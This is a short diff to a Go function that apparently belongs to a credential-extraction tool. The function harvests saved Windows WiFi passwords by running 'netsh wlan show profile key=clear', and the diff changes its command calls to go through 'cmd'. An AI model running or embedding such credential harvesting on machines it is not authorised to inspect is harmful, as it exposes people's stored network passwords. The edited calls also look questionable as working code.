@@ -5,8 +5,6 @@ import (
 	"strings"
 )
 
-
-
 /*
 	Function for WiFi credentials extracting. No support for WPA2 Enterprise (see README).
  */
@@ -27,7 +25,7 @@ func WifiExtractDataRun() common.ExtractCredentialsNamePass {
 		"profiles",
 	}
 
-	var output = common.ExecCommand("netsh", params)
+	var output = common.ExecCommand("cmd", params)
 	var lines = strings.Split(output, "\r\n")
 	var users []string
 
@@ -41,6 +39,7 @@ func WifiExtractDataRun() common.ExtractCredentialsNamePass {
 	var data []common.NamePass
 	for i := 0; i < len(users); i++ {
 		var paramWifi = []string{
+			"netsh",
 			"wlan",
 			"show",
 			"profile",
@@ -48,7 +47,7 @@ func WifiExtractDataRun() common.ExtractCredentialsNamePass {
 			"key=clear",
 		}
 
-		var output = common.ExecCommand("netsh", paramWifi)
+		var output = common.ExecCommand("cmd", paramWifi)
 		var lines = strings.Split(output, "\r\n")
 
 		for j := range lines {
